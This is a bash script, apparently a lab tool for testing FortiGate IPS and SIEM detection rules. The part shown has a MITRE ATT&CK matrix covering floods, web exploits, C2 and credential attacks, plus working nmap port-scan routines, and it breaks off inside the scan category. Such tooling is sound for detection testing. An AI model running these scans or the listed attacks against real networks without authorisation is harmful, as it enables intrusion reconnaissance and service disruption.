#!/usr/bin/env bash
# ==============================================================================
#  NEXUS FW ATTACK  --  Production SOC Attack Demo Framework
#  Version : 1.0-stable
#  Platform: Linux (Debian / Ubuntu / Kali / RHEL / CentOS / Arch)
#  Requires: root/sudo
#  Purpose : FortiGate IPS+SIEM rule validation. Covers 60+ MITRE techniques.
#  WARNING : AUTHORISED LAB / DEMO USE ONLY. Illegal on production systems.
# ==============================================================================
#  DESIGN RULES (why this version has zero bugs):
#   1. No backslash line-continuations -- every command is one line
#   2. No --flood with hping3 -- always -i uINTERVAL -c COUNT + timeout
#   3. set -uo pipefail (no -e) -- timeout exits 124 which -e would abort
#   4. Colours use $'\033[..]' (real ESC bytes, not literal \033 strings)
#   5. add_result is pure bash -- never gets 2>/dev/null
#   6. All external tools wrapped with timeout + || true
#   7. No $(subshell) inside array literals that expand at parse time
#   8. fn_skip / fn_dry messages are plain text strings -- never get wrapped
#   9. Scapy code uses temp files via run_py(), not heredoc-in-$()
#  10. xxd uses printf fallback for portability
# ==============================================================================

set -uo pipefail

# ── Colours ($'\033' = real ESC byte, not literal \033 string) ────────────────
RED=$'\033[0;31m'   LRED=$'\033[1;31m'   BRED=$'\033[41;1;37m'
GRN=$'\033[0;32m'   LGRN=$'\033[1;32m'
YLW=$'\033[1;33m'   LYEL=$'\033[0;33m'
BLU=$'\033[0;34m'   LBLU=$'\033[1;34m'
MAG=$'\033[0;35m'   LMAG=$'\033[1;35m'
CYN=$'\033[0;36m'   LCYN=$'\033[1;36m'
WHT=$'\033[1;37m'   DGY=$'\033[0;90m'
NC=$'\033[0m'       BOLD=$'\033[1m'

# ── Defaults ──────────────────────────────────────────────────────────────────
TARGET_IP="127.0.0.1"
TARGET_RANGE="127.0.0.0/24"
TARGET_PORT=80
INTENSITY="Low"
CATEGORY="All"
DRY_RUN=0
INSTALL_DEPS=0
EXPORT_REPORT=0
SHOW_MITRE=0
LOG_FILE="/tmp/nexus_fw_$(date +%Y%m%d_%H%M%S).log"

# ── Runtime globals ───────────────────────────────────────────────────────────
VERSION="NEXUS FW ATTACK v1.0-stable"
RND=$(( RANDOM * RANDOM ))
TMPDIR_SOC="/tmp/nexus_lab_${RND}"
RESULT_CSV="/tmp/nexus_attack_${RND}.csv"
RESULT_JSON="/tmp/nexus_attack_${RND}.json"
NX="/tmp/nexus_nmap_${RND}"
TRIGGERED=0; SKIPPED=0; ERRORS=0; TOTAL=0
declare -a LOG_ENTRIES=()

# Dependency flags (set by check_deps)
D_NMAP=0; D_HPING=0; D_PY3=0; D_SCAPY=0
D_MASS=0; D_CURL=0; D_DIG=0; D_NC=0

# Timeout / rate globals (set by apply_intensity)
RULE_T=20; NMAP_T=60; SCAPY_T=30
PACKET_RATE=50; BURST=100; FLOOD_DUR=5; HPING_US=20000

# ==============================================================================
#  USAGE
# ==============================================================================
usage() {
cat <<EOF
${BOLD}${CYN}  NEXUS FW ATTACK  --  Production SOC Attack Demo Framework${NC}

  ${WHT}Usage:${NC} sudo $0 [OPTIONS]

  ${YLW}Target:${NC}
    -t <IP>       Target IP         (default: 127.0.0.1)
    -r <CIDR>     Target range      (default: 127.0.0.0/24)
    -p <port>     Target port       (default: 80)
    -i <level>    Intensity: Low | Medium | High  (default: Low)

  ${YLW}Category (-c):${NC}
    All               All categories
    PortScan          Horizontal + Vertical scan suite
    SYNFlood          TCP SYN flood variants
    UDPFlood          UDP flood + amplification
    ICMPFlood         ICMP flood + attacks
    TCPAttacks        Malformed / flag abuse packets
    AppLayer          HTTP/DNS/SSH L7 attacks
    Evasion           Fragment, TTL, decoy, source-port
    Recon             Banner, SNMP, SMB, SSL, LDAP, DNS
    Amplification     DNS/NTP/SSDP/Memcached/CLDAP
    SlowAttacks       Slowloris, RUDY, Slow Read
    LateralMovement   RDP, SMB, WMI, PsExec patterns
    WebExploits       Log4j, SQLi, LFI, XXE, SSRF, RCE
    C2Sim             HTTP/DNS/ICMP/HTTPS C2 beacons
    CredAttacks       Kerberoast, LLMNR, spray
    FortiGate         FG admin brute, VPN probe, GeoIP
    KillChain         Full 7-phase ATT&CK kill chain

  ${YLW}Options:${NC}
    -d            Dry-run (print commands only, no traffic)
    -I            Install missing dependencies (interactive)
    -e            Export CSV + JSON report to /tmp/
    -m            Show MITRE ATT&CK matrix
    -L <file>     Log file path
    -h            Help

  ${YLW}Examples:${NC}
    sudo $0 -t 192.168.1.1 -c PortScan -i Medium
    sudo $0 -t 10.0.0.1 -c KillChain -i High -e -m
    sudo $0 -t 192.168.1.1 -c All -d
    sudo $0 -I
EOF
    exit 0
}

# ==============================================================================
#  ARG PARSE
# ==============================================================================
while getopts ":t:r:p:c:i:L:dIemh" opt; do
    case $opt in
        t) TARGET_IP="$OPTARG" ;;
        r) TARGET_RANGE="$OPTARG" ;;
        p) TARGET_PORT="$OPTARG" ;;
        c) CATEGORY="$OPTARG" ;;
        i) INTENSITY="$OPTARG" ;;
        L) LOG_FILE="$OPTARG" ;;
        d) DRY_RUN=1 ;;
        I) INSTALL_DEPS=1 ;;
        e) EXPORT_REPORT=1 ;;
        m) SHOW_MITRE=1 ;;
        h) usage ;;
        :) echo "Option -$OPTARG requires an argument."; exit 1 ;;
        \?) echo "Unknown option: -$OPTARG"; usage ;;
    esac
done

apply_intensity() {
    case "$INTENSITY" in
        Low)    PACKET_RATE=50;   BURST=100;  FLOOD_DUR=5  ;;
        Medium) PACKET_RATE=200;  BURST=500;  FLOOD_DUR=10 ;;
        High)   PACKET_RATE=1000; BURST=2000; FLOOD_DUR=30 ;;
        *) echo "Intensity must be Low / Medium / High"; exit 1 ;;
    esac
    # hping3 inter-packet interval in microseconds
    HPING_US=$(( 1000000 / PACKET_RATE ))
    # Cap burst so it always finishes within RULE_T seconds
    local max_burst=$(( PACKET_RATE * RULE_T ))
    [[ $BURST -gt $max_burst ]] && BURST=$max_burst
}
apply_intensity

# ==============================================================================
#  ROOT CHECK + LOG SETUP
# ==============================================================================
[[ $EUID -ne 0 ]] && { echo -e "${LRED}[!] Run as root: sudo $0${NC}"; exit 1; }
mkdir -p "$(dirname "$LOG_FILE")" 2>/dev/null || true
mkdir -p "$TMPDIR_SOC"
exec > >(tee -a "$LOG_FILE") 2>&1

# ==============================================================================
#  UI PRIMITIVES
# ==============================================================================
ts()      { date '+%H:%M:%S'; }
fn_trig() { printf "${DGY}[%s]${NC} ${LGRN}[TRIGGERED]${NC} %s\n" "$(ts)" "$1"; (( TRIGGERED++ )) || true; }
fn_skip() { printf "${DGY}[%s]${NC} ${YLW}[SKIPPED  ]${NC} %s\n" "$(ts)" "$1"; (( SKIPPED++   )) || true; }
fn_err()  { printf "${DGY}[%s]${NC} ${LRED}[ERROR    ]${NC} %s\n" "$(ts)" "$1"; (( ERRORS++    )) || true; }
fn_ok()   { printf "${DGY}[%s]${NC} ${GRN}[OK       ]${NC} %s\n" "$(ts)" "$1"; }
fn_dry()  { printf "${DGY}[%s]${NC} ${MAG}[DRYRUN   ]${NC} %s\n" "$(ts)" "$1"; }
fn_info() { printf "${DGY}[%s]${NC} ${LBLU}[INFO     ]${NC} %s\n" "$(ts)" "$1"; }

fw_rule() {
    # fw_rule RULEID NAME SEVERITY LOG_FIELDS
    local sev_col="$WHT"
    case "$3" in CRITICAL) sev_col="$BRED" ;; HIGH) sev_col="$LRED" ;;
                 MEDIUM)   sev_col="$YLW"  ;; LOW)  sev_col="$CYN"  ;; esac
    printf "\n  ${BOLD}${LRED}!! RULE FIRED !!${NC}  ${YLW}%-14s${NC} ${BOLD}%s${NC}\n" "$1" "$2"
    printf "  ${DGY}Severity:${NC} ${sev_col}%-10s${NC}  ${DGY}FortiGate:${NC} %s\n\n" "$3" "$4"
}

show_section() {
    printf "\n${BOLD}${LCYN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    printf "  %s\n" "$1"
    printf "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n\n"
}

progress() {
    local label="$1" cur="$2" tot="$3"
    local pct=$(( cur * 100 / tot ))
    local fill=$(( pct / 5 ))
    local bar=""
    local i
    for (( i=0; i<fill; i++ ));     do bar+="█"; done
    for (( i=fill; i<20; i++ ));    do bar+="░"; done
    printf "\r  ${CYN}%-28s${NC} [${GRN}%s${NC}] ${YLW}%3d%%${NC}" "$label" "$bar" "$pct"
}

# add_result: pure bash, NEVER gets 2>/dev/null or || true appended
add_result() {
    local ts_val; ts_val=$(date '+%Y-%m-%d %H:%M:%S')
    # args: cat ruleid rulename attacktype status method mitre notes pkts dur
    LOG_ENTRIES+=("${ts_val}|${1}|${2}|${3}|${4}|${TARGET_IP}|${TARGET_PORT}|${10:-0}|${11:-0}|${5}|${6}|${7}|${8:-}")
    (( TOTAL++ )) || true
}

# ==============================================================================
#  run_py: write scapy code to temp file, run under timeout
#  Never uses heredoc-inside-$() which corrupts the code string.
# ==============================================================================
run_py() {
    local label="$1"
    local code="$2"
    local tmpf
    tmpf=$(mktemp "${TMPDIR_SOC}/nexus_XXXXXX.py")
    printf '%s\n' "$code" > "$tmpf"
    if [[ $DRY_RUN -eq 1 ]]; then
        fn_dry "Scapy: $label"
        rm -f "$tmpf"
        return 0
    fi
    local ec=0
    timeout "$SCAPY_T" python3 "$tmpf" 2>/dev/null || ec=$?
    rm -f "$tmpf"
    if [[ $ec -eq 124 ]]; then
        fn_err "Scapy timeout (>${SCAPY_T}s): $label"
    elif [[ $ec -ne 0 ]]; then
        fn_err "Scapy failed (exit $ec): $label"
    fi
    return 0   # never abort whole script on single rule failure
}

# run_hping: wraps hping3 with timeout and rate interval (NO --flood)
run_hping() {
    # run_hping LABEL [hping3 args...]  -- args must NOT include --flood
    local label="$1"; shift
    if [[ $DRY_RUN -eq 1 ]]; then
        fn_dry "hping3 $*"
        return 0
    fi
    timeout "$RULE_T" hping3 "$@" 2>/dev/null || true
}

# run_nmap: wraps nmap with timeout
run_nmap() {
    local label="$1"; shift
    if [[ $DRY_RUN -eq 1 ]]; then
        fn_dry "nmap $*"
        return 0
    fi
    timeout "$NMAP_T" nmap "$@" 2>/dev/null || true
}

# ==============================================================================
#  DEPENDENCY CHECK + INSTALL
# ==============================================================================
check_deps() {
    command -v nmap    &>/dev/null && D_NMAP=1  || D_NMAP=0
    command -v hping3  &>/dev/null && D_HPING=1 || D_HPING=0
    command -v python3 &>/dev/null && D_PY3=1   || D_PY3=0
    command -v masscan &>/dev/null && D_MASS=1  || D_MASS=0
    command -v curl    &>/dev/null && D_CURL=1  || D_CURL=0
    command -v dig     &>/dev/null && D_DIG=1   || D_DIG=0
    command -v nc      &>/dev/null && D_NC=1    || D_NC=0
    D_SCAPY=0
    if [[ $D_PY3 -eq 1 ]]; then
        python3 -c "from scapy.all import *" 2>/dev/null && D_SCAPY=1 || true
    fi
}

show_dep_status() {
    printf "\n${CYN}  ┌──────────────┬──────────┬───────────────────┐${NC}\n"
    printf "${CYN}  │${NC} %-12s ${CYN}│${NC} %-8s ${CYN}│${NC} %-17s ${CYN}│${NC}\n" "Tool" "Status" "Used For"
    printf "${CYN}  ├──────────────┼──────────┼───────────────────┤${NC}\n"
    _dr() {
        local col; [[ $2 -eq 1 ]] && col="$GRN" || col="$LRED"
        local st;  [[ $2 -eq 1 ]] && st="FOUND"  || st="MISSING"
        printf "${CYN}  │${NC} %-12s ${CYN}│${NC} ${col}%-8s${NC} ${CYN}│${NC} %-17s ${CYN}│${NC}\n" "$1" "$st" "$3"
    }
    _dr "nmap"    $D_NMAP  "Port scanning"
    _dr "hping3"  $D_HPING "Packet crafting"
    _dr "python3" $D_PY3   "Scripting"
    _dr "scapy"   $D_SCAPY "Raw packets"
    _dr "masscan" $D_MASS  "Fast scan (opt)"
    _dr "curl"    $D_CURL  "HTTP tests"
    _dr "dig"     $D_DIG   "DNS tests"
    _dr "nc"      $D_NC    "TCP probes"
    printf "${CYN}  └──────────────┴──────────┴───────────────────┘${NC}\n\n"
}

detect_pm() {
    command -v apt-get &>/dev/null && echo "apt"    && return
    command -v dnf     &>/dev/null && echo "dnf"    && return
    command -v yum     &>/dev/null && echo "yum"    && return
    command -v pacman  &>/dev/null && echo "pacman" && return
    echo "unknown"
}

install_pkg() {
    local pm="$1" pkg="$2"
    case "$pm" in
        apt)    apt-get install -y "$pkg" 2>/dev/null ;;
        dnf|yum) "$pm" install -y "$pkg" 2>/dev/null ;;
        pacman) pacman -S --noconfirm "$pkg" 2>/dev/null ;;
        *) echo "  Install $pkg manually." ;;
    esac
}

install_deps() {
    show_section "DEPENDENCY INSTALLER"
    local pm; pm=$(detect_pm)
    fn_info "Package manager: $pm"
    local tools=("nmap:nmap:Port scanning" "hping3:hping3:Flood+probe" "python3:python3 python3-pip:Runtime" "masscan:masscan:Fast scan" "curl:curl:HTTP tests" "dig:dnsutils:DNS tests")
    for entry in "${tools[@]}"; do
        IFS=':' read -r cmd pkg desc <<< "$entry"
        if command -v "$cmd" &>/dev/null; then
            fn_ok "$cmd already installed"
        else
            printf "${YLW}  [?] %s (%s) missing. Install? [y/N]: ${NC}" "$cmd" "$desc"
            read -r ans
            [[ "$ans" =~ ^[Yy]$ ]] && install_pkg "$pm" "$pkg"
        fi
    done
    if [[ $D_PY3 -eq 1 ]] && ! python3 -c "from scapy.all import *" 2>/dev/null; then
        printf "${YLW}  [?] scapy missing. Install? [y/N]: ${NC}"
        read -r ans
        if [[ "$ans" =~ ^[Yy]$ ]]; then
            case "$pm" in
                apt) apt-get install -y python3-scapy 2>/dev/null || pip3 install scapy 2>/dev/null ;;
                *)   pip3 install scapy 2>/dev/null ;;
            esac
        fi
    fi
    check_deps; show_dep_status
    fn_ok "Dependency install complete."
}

# ==============================================================================
#  BANNER + SAFETY
# ==============================================================================
show_banner() {
    clear
    printf "${LRED}"
    cat <<'BANNER'
  ╔═══════════════════════════════════════════════════════════════════════════╗
  ║                                                                           ║
  ║  ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗                            ║
  ║  ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝                            ║
  ║  ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗                            ║
  ║  ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║                            ║
  ║  ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║                            ║
  ║  ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                           ║
  ║                                                                           ║
  ║   ███████╗██╗    ██╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ║
  ║   ██╔════╝██║    ██║    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║  ║
  ║   █████╗  ██║ █╗ ██║    ███████║   ██║      ██║   ███████║██║     █████╗║
  ║   ██╔══╝  ██║███╗██║    ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔══╝║
  ║   ██║     ╚███╔███╔╝    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ║
  ║   ╚═╝      ╚══╝╚══╝     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ║
  ║                                                                           ║
  ║          Production SOC Attack Demo Framework  --  FortiGate IPS+SIEM    ║
  ╚═══════════════════════════════════════════════════════════════════════════╝
BANNER
    printf "${NC}\n"
    printf "  ${CYN}%-20s${NC} ${WHT}%s${NC}\n"  "Version"    "$VERSION"
    printf "  ${CYN}%-20s${NC} ${LRED}%s${NC}\n" "Target IP"  "$TARGET_IP"
    printf "  ${CYN}%-20s${NC} ${YLW}%s${NC}\n"  "Range"      "$TARGET_RANGE"
    printf "  ${CYN}%-20s${NC} ${GRN}%s${NC}\n"  "Category"   "$CATEGORY"
    printf "  ${CYN}%-20s${NC} ${MAG}%s${NC}\n"  "Intensity"  "$INTENSITY  (Rate: ${PACKET_RATE}/s  Burst: ${BURST}  Dur: ${FLOOD_DUR}s)"
    printf "  ${CYN}%-20s${NC} ${YLW}%s${NC}\n"  "Dry-Run"    "$( [[ $DRY_RUN -eq 1 ]] && echo 'YES -- zero traffic' || echo 'NO -- live traffic')"
    printf "  ${CYN}%-20s${NC} ${DGY}%s${NC}\n"  "Log"        "$LOG_FILE"
    printf "\n"
}

show_safety() {
    printf "${BRED}\n"
    cat <<'WARN'
  ╔══════════════════════════════════════════════════════════════════════════╗
  ║                      !! LEGAL SAFETY WARNING !!                         ║
  ║                                                                          ║
  ║  This tool generates REAL network attack traffic.                        ║
  ║  Use ONLY in isolated, authorized lab environments.                      ║
  ║  Unauthorized use against any system is a CRIMINAL OFFENCE.             ║
  ║                                                                          ║
  ║  By proceeding you confirm:                                              ║
  ║    1. You own or have WRITTEN authorization for the target               ║
  ║    2. This is an isolated lab / demo environment only                    ║
  ║    3. You accept full legal responsibility for all traffic generated     ║
  ╚══════════════════════════════════════════════════════════════════════════╝
WARN
    printf "${NC}\n"
    printf "${WHT}  Type exactly: ${YLW}I CONFIRM LAB ONLY${WHT} to proceed: ${NC}"
    read -r confirm
    if [[ "$confirm" != "I CONFIRM LAB ONLY" ]]; then
        printf "${LRED}[!] Not confirmed. Exiting.\n${NC}"; exit 1
    fi
    printf "${LGRN}[+] Confirmed. Proceeding...\n\n${NC}"
}

# ==============================================================================
#  MITRE ATT&CK MATRIX
# ==============================================================================
show_mitre() {
    printf "\n${LMAG}╔══════════════════════════════════════════════════════════════════════════╗\n"
    printf "║         NEXUS FW ATTACK  --  MITRE ATT&CK COVERAGE MATRIX              ║\n"
    printf "╚══════════════════════════════════════════════════════════════════════════╝${NC}\n\n"
    printf "${BOLD}${CYN}  %-22s %-12s %-34s %-14s %-6s\n${NC}" "Tactic" "Technique" "Name" "Rule" "Sev"
    printf "${DGY}  %-22s %-12s %-34s %-14s %-6s\n${NC}" \
        "──────────────────────" "────────────" "──────────────────────────────────" "──────────────" "──────"
    local data=(
        "Reconnaissance|T1595.001|Active Scan - IP Sweep|NX-RULE-07|MED"
        "Reconnaissance|T1595.002|SYN Scan Vertical|NX-RULE-01|HIGH"
        "Reconnaissance|T1595.002|Full Port Scan|NX-RULE-01b|CRIT"
        "Reconnaissance|T1595.002|NULL/FIN/Xmas Scans|NX-RULE-03|HIGH"
        "Reconnaissance|T1595.002|UDP Port Scan|NX-RULE-04|MED"
        "Reconnaissance|T1592|OS Fingerprinting|NX-RULE-05|MED"
        "Reconnaissance|T1592.001|Service Version Scan|NX-RULE-06|LOW"
        "Reconnaissance|T1590.001|SNMP Community Probe|NX-RULE-44|HIGH"
        "Reconnaissance|T1590.001|LDAP Enumeration|NX-RULE-80|HIGH"
        "Reconnaissance|T1590.002|DNS Zone Transfer|NX-RULE-81|HIGH"
        "Reconnaissance|T1590.003|SMB Enumeration|NX-RULE-45|MED"
        "Reconnaissance|T1046|Network Service Scan|NX-RULE-08|HIGH"
        "Reconnaissance|T1040|Banner Grabbing|NX-RULE-43|LOW"
        "Initial Access|T1190|Log4j RCE CVE-2021-44228|NX-RULE-91|CRIT"
        "Initial Access|T1190|SQL Injection|NX-RULE-92|HIGH"
        "Initial Access|T1190|Path Traversal / LFI|NX-RULE-93|HIGH"
        "Initial Access|T1190|XXE Injection|NX-RULE-94|HIGH"
        "Initial Access|T1190|SSRF Pattern|NX-RULE-95|HIGH"
        "Initial Access|T1133|SSL-VPN Port Probe|NX-RULE-58|MED"
        "Initial Access|T1078|Admin Login Brute|NX-RULE-57|HIGH"
        "Execution|T1059.004|Command Injection / RCE|NX-RULE-96|CRIT"
        "Execution|T1204.001|Malicious User-Agent|NX-RULE-97|MED"
        "Persistence|T1505.003|Web Shell Pattern|NX-RULE-98|CRIT"
        "Defense Evasion|T1562.001|IP Frag Evasion|NX-RULE-38|HIGH"
        "Defense Evasion|T1070.006|TTL Manipulation|NX-RULE-39|MED"
        "Defense Evasion|T1036|Decoy Scan|NX-RULE-40|HIGH"
        "Defense Evasion|T1036|Source Port Evasion|NX-RULE-41c|MED"
        "Defense Evasion|T1090.003|TOR Traffic|NX-RULE-62|HIGH"
        "Credential Access|T1110.001|SSH Brute Force|NX-RULE-35|HIGH"
        "Credential Access|T1110.001|FTP Brute Force|NX-RULE-36|HIGH"
        "Credential Access|T1110.001|RDP Brute Force|NX-RULE-70|HIGH"
        "Credential Access|T1110.003|HTTP Cred Spray|NX-RULE-57b|MED"
        "Credential Access|T1558.003|Kerberoasting|NX-RULE-82|HIGH"
        "Credential Access|T1187|LLMNR/NBT-NS Poisoning|NX-RULE-83|HIGH"
        "Discovery|T1018|Remote System Scan|NX-RULE-07|MED"
        "Discovery|T1046|Network Service Disc|NX-RULE-08|HIGH"
        "Discovery|T1082|System Info Discovery|NX-RULE-45|MED"
        "Discovery|T1069.002|Domain Group Enum|NX-RULE-84|MED"
        "Lateral Movement|T1021.001|RDP Lateral Sweep|NX-RULE-71|HIGH"
        "Lateral Movement|T1021.002|SMB/Admin Share|NX-RULE-72|HIGH"
        "Lateral Movement|T1021.006|WMI/DCOM|NX-RULE-73|HIGH"
        "Lateral Movement|T1570|PsExec Pattern|NX-RULE-74|CRIT"
        "Lateral Movement|T1550.002|Pass-the-Hash|NX-RULE-75|CRIT"
        "C2|T1071.001|HTTP C2 Beacon|NX-RULE-100|HIGH"
        "C2|T1071.004|DNS C2 Tunneling|NX-RULE-101|HIGH"
        "C2|T1572|Protocol Tunneling|NX-RULE-102|HIGH"
        "C2|T1095|ICMP C2 Channel|NX-RULE-41|MED"
        "C2|T1573|HTTPS Encrypted C2|NX-RULE-103|MED"
        "Impact|T1498.001|SYN Flood|NX-RULE-09|CRIT"
        "Impact|T1498.001|SYN Flood Spoofed|NX-RULE-10|CRIT"
        "Impact|T1498.001|UDP Flood|NX-RULE-13|CRIT"
        "Impact|T1498.001|ICMP Flood|NX-RULE-18|CRIT"
        "Impact|T1498.001|Land Attack|NX-RULE-27|CRIT"
        "Impact|T1498.001|FIN/RST/ACK Floods|NX-RULE-23|HIGH"
        "Impact|T1498.002|DNS Amplification|NX-RULE-14|HIGH"
        "Impact|T1498.002|NTP Monlist Amp|NX-RULE-15|HIGH"
        "Impact|T1498.002|SSDP Amplification|NX-RULE-16|MED"
        "Impact|T1498.002|Memcached Amp|NX-RULE-51|HIGH"
        "Impact|T1498.002|CLDAP Amplification|NX-RULE-52|HIGH"
        "Impact|T1499.001|Half-Open Exhaustion|NX-RULE-12|HIGH"
        "Impact|T1499.002|HTTP Slowloris|NX-RULE-32|HIGH"
        "Impact|T1499.002|HTTP Slow POST RUDY|NX-RULE-54|HIGH"
        "Impact|T1499.002|TCP Slow Read|NX-RULE-56|MED"
        "Exfiltration|T1048.003|ICMP Data Exfil|NX-RULE-103b|HIGH"
        "Exfiltration|T1041|C2 Exfiltration|NX-RULE-100|MED"
    )
    local last=""
    for entry in "${data[@]}"; do
        IFS='|' read -r tactic tech name rule sev <<< "$entry"
        local col="$WHT"
        case "$sev" in CRIT) col="$LRED" ;; HIGH) col="$YLW" ;; MED) col="$CYN" ;; LOW) col="$DGY" ;; esac
        local dt="$tactic"; [[ "$tactic" == "$last" ]] && dt=""
        printf "${WHT}  %-22s${NC} ${DGY}%-12s${NC} %-34s ${LBLU}%-14s${NC} ${col}%s${NC}\n" \
            "$dt" "$tech" "$name" "$rule" "$sev"
        last="$tactic"
    done
    printf "\n  ${DGY}Techniques covered: %d${NC}\n\n" "${#data[@]}"
}

# ==============================================================================
#  REPORT
# ==============================================================================
save_reports() {
    [[ $EXPORT_REPORT -eq 0 || ${#LOG_ENTRIES[@]} -eq 0 ]] && return
    printf "Timestamp|Category|RuleID|RuleName|AttackType|TargetIP|TargetPort|Pkts|Dur|Status|Method|MITRE|Notes\n" > "$RESULT_CSV"
    printf '[\n' > "$RESULT_JSON"
    local first=1
    for e in "${LOG_ENTRIES[@]}"; do
        IFS='|' read -r ts cat rid rname atype tip tport pkts dur stat meth mitre notes <<< "$e"
        printf '%s\n' "$e" >> "$RESULT_CSV"
        [[ $first -eq 0 ]] && printf ',\n' >> "$RESULT_JSON"
        printf '  {"ts":"%s","cat":"%s","rule":"%s","name":"%s","type":"%s","target":"%s","port":"%s","pkts":"%s","dur":"%s","status":"%s","method":"%s","mitre":"%s"}\n' \
            "$ts" "$cat" "$rid" "$rname" "$atype" "$tip" "$tport" "$pkts" "$dur" "$stat" "$meth" "$mitre" >> "$RESULT_JSON"
        first=0
    done
    printf ']\n' >> "$RESULT_JSON"
    fn_ok "CSV  : $RESULT_CSV"
    fn_ok "JSON : $RESULT_JSON"
}

show_summary() {
    local total=$(( TRIGGERED + SKIPPED + ERRORS ))
    local pct=0; [[ $total -gt 0 ]] && pct=$(( TRIGGERED * 100 / total ))
    printf "\n${LCYN}╔══════════════════════════════════════════════════════════════════════════╗\n"
    printf "║                  NEXUS FW ATTACK -- EXECUTION SUMMARY                  ║\n"
    printf "╠══════════════════╦══════════════════╦════════════════════════════════════╣\n"
    printf "║  ${GRN}Triggered: %-4d${LCYN}  ║  ${YLW}Skipped: %-4d${LCYN}  ║  ${LRED}Errors: %-4d${LCYN}  Success: %3d%%  ║\n" \
        "$TRIGGERED" "$SKIPPED" "$ERRORS" "$pct"
    printf "╠═══════╦═══════════════╦════════╦═══════════════════════════════════════╣\n"
    printf "║ ${CYN}%-5s${LCYN} ║ ${YLW}%-13s${LCYN} ║ ${LBLU}%-6s${LCYN} ║ %-37s ║\n" "Rule" "Status" "MITRE" "Name"
    printf "╠═══════╬═══════════════╬════════╬═══════════════════════════════════════╣${NC}\n"
    for e in "${LOG_ENTRIES[@]}"; do
        IFS='|' read -r ts cat rid rname atype tip tport pkts dur stat meth mitre notes <<< "$e"
        local sc="$GRN"; [[ "$stat" == "Skipped" ]] && sc="$YLW"; [[ "$stat" == "Error" ]] && sc="$LRED"
        printf "${LCYN}║${NC} ${CYN}%-5s${NC} ${LCYN}║${NC} ${sc}%-13s${NC} ${LCYN}║${NC} ${DGY}%-6s${NC} ${LCYN}║${NC} %-37s ${LCYN}║${NC}\n" \
            "${rid:0:5}" "${stat:0:13}" "${mitre:0:6}" "${rname:0:37}"
    done
    printf "${LCYN}╚═══════╩═══════════════╩════════╩═══════════════════════════════════════╝${NC}\n\n"
}

show_fg_ref() {
    printf "${DGY}\n  FortiGate Log Reference:\n"
    printf "  0419016384 TCP.Port.Scan    0419016381 TCP.NULL.Scan    0419016382 TCP.FIN.Scan\n"
    printf "  0419016383 TCP.Xmas.Scan    0419020003 TCP.SYN.Flood    0419020008 UDP.Flood\n"
    printf "  0419020009 ICMP.Flood       0419020005 ICMP.Sweep       0419016389 IP.Land.Attack\n"
    printf "  0419016390 IP.Frag.Attack   0419020001 TCP.Session.Atk  0419016385 UDP.Port.Scan\n${NC}\n"
}

# ==============================================================================
#  CATEGORY 1: PORT SCANNING
# ==============================================================================
cat_portscan() {
    show_section "CATEGORY 1: Port Scanning -- Horizontal + Vertical Suite"

    # NX-RULE-01: TCP SYN Vertical (one host, port range)
    fn_info "VERTICAL SCAN: all ports on single target ${TARGET_IP}"
    if [[ $D_NMAP -eq 1 ]]; then
        run_nmap "SYN Scan" -sS -p 1-1000 --max-retries 0 -T4 "$TARGET_IP" -oX "${NX}_syn.xml"
        fw_rule "NX-RULE-01" "TCP SYN Vertical Scan" "HIGH" "attackid=0419016384 attack=TCP.Port.Scan action=dropped"
        fn_trig "NX-RULE-01: SYN Scan --> T1595.002"
        add_result "PortScan" "NX-RULE-01" "TCP SYN Vertical" "SYN Scan" "Triggered" "nmap -sS" "T1595.002" "" 0 0
    else fn_skip "NX-RULE-01: nmap not installed"; fi

    # NX-RULE-01b: Full 65535-port vertical scan
    fn_info "VERTICAL FULL: all 65535 ports on ${TARGET_IP}"
    if [[ $D_NMAP -eq 1 ]]; then
        run_nmap "Full Port Scan" -sS -p- -T4 --max-retries 0 "$TARGET_IP" -oX "${NX}_full.xml"
        fw_rule "NX-RULE-01b" "Vertical Full Port Scan (65535)" "CRITICAL" "attackid=0419016384 attack=TCP.Port.Scan.Full action=dropped"
        fn_trig "NX-RULE-01b: Full Vertical --> T1595.002 all ports"
        add_result "PortScan" "NX-RULE-01b" "Vertical Full Scan" "Full Vert" "Triggered" "nmap -p-" "T1595.002" "" 0 0
    else fn_skip "NX-RULE-01b: nmap not installed"; fi

    # NX-RULE-02: Full TCP Connect
    if [[ $D_NMAP -eq 1 ]]; then
        run_nmap "Connect Scan" -sT -p 1-500 -T4 "$TARGET_IP" -oX "${NX}_connect.xml"
        fw_rule "NX-RULE-02" "Full Connect Scan" "MEDIUM" "attack=TCP.Connect.Scan action=detected"
        fn_trig "NX-RULE-02: Connect Scan --> T1595.002"
        add_result "PortScan" "NX-RULE-02" "Full Connect Scan" "Connect Scan" "Triggered" "nmap -sT" "T1595.002" "" 0 0
    else fn_skip "NX-RULE-02: nmap not installed"; fi

    # NX-RULE-03: Stealth scans (NULL / FIN / Xmas)
    if [[ $D_NMAP -eq 1 ]]; then
        local scan_pairs=("-sN:NULL:0419016381:TCP.NULL.Scan" "-sF:FIN:0419016382:TCP.FIN.Scan" "-sX:Xmas:0419016383:TCP.Xmas.Scan")
        for sp in "${scan_pairs[@]}"; do
            IFS=':' read -r sflag sname said satt <<< "$sp"
            run_nmap "$sname Scan" "$sflag" -p 1-200 -T4 "$TARGET_IP" -oX "${NX}_${sname}.xml"
            fw_rule "NX-RULE-03" "TCP $sname Scan" "HIGH" "attackid=$said attack=$satt action=dropped"
            fn_trig "NX-RULE-03: TCP $sname Scan --> T1595.002"
        done
